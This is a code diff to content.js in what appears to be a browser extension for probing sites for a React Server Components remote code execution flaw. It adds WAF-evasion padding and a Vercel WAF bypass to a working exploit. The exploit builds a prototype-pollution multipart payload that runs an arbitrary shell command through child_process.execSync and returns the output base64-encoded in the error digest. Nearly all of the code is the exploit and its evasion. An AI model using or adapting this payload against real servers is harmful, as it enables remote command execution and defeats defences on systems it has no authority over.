@@ -1,5 +1,18 @@
 // content.js
 
+// 12字符[a-z0-9]
+function shortRandString() {
+    return Math.random().toString(36).substring(2).padEnd(12, '0');
+}
+
+// 随机的base64长字符串，长度为 bytes 字符
+function longRandString(bytes) {
+    const length = bytes;
+    const buf = new Uint8Array((length * 3 + 2) / 4); // Base64 编码后长度是原来的 4/3
+    crypto.getRandomValues(buf);
+    return btoa(String.fromCharCode(...buf)).substring(0, length);
+}
+
 // === 1. 被动检测 ===
 function performPassiveScan() {
     let score = 0;
@@ -45,16 +58,25 @@ async function performFingerprint() {
 }
 
 // === 3. RCE 漏洞利用 ===
-async function performExploit(cmd) {
-    // 默认命令
-    const targetCmd = cmd || "echo vulnerability_test";
-    
+async function performExploit({cmd = "echo vulnerability_test", pad = 0, bypassVercel = false} = {}) {
     // 构造 Payload，动态插入命令
     // 注意：这里需要处理 JS 转义，简单起见直接替换
     // Payload 逻辑: execSync('YOUR_CMD').toString().trim()
-    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${targetCmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`;
-    const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
-    const bodyParts = [
+    // pad, vercel WAF bypass 逻辑来自 https://github.com/assetnote/react2shell-scanner
+    const formData = bypassVercel ? '"get":"$3:\\"$$:constructor:constructor"}' : '{"get":"$1:constructor:constructor"}';
+    const payloadJson = `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"var res=process.mainModule.require('child_process').execSync('${cmd}').toString('base64');throw Object.assign(new Error('x'),{digest: res});","_chunks":"$Q2","_formData":${formData}}}`;
+    const boundary = `----WebKitFormBoundaryO2WP${shortRandString()}`;
+    let form = [];
+    if (pad > 0) {
+        form.push(
+            `--${boundary}`,
+            `Content-Disposition: form-data; name="${shortRandString()}"`,
+            '',
+            longRandString(pad * 1024),
+            `--${boundary}`,
+        );
+    }
+    form.push(
         `--${boundary}`,
         'Content-Disposition: form-data; name="0"',
         '',
@@ -67,9 +89,20 @@ async function performExploit(cmd) {
         'Content-Disposition: form-data; name="2"',
         '',
         '[]',
+    );
+    if (bypassVercel) {
+        form.push(
+            `--${boundary}`,
+            'Content-Disposition: form-data; name="3"',
+            '',
+            '{"\\"$$":{}}',
+        );
+    }
+    form.push(
         `--${boundary}--`,
         ''
-    ].join('\r\n');
+    );
+    const bodyParts = form.join('\r\n');
 
     const targetUrl = "/adfa"; // 使用相对路径
 
@@ -143,7 +176,7 @@ chrome.runtime.onMessage.addListener((req, sender, sendResponse) => {
         return true;
     }
     if (req.action === "run_exploit") {
-        performExploit(req.cmd).then(res => sendResponse(res));
+        performExploit(req).then(res => sendResponse(res));
         return true;
     }
 });
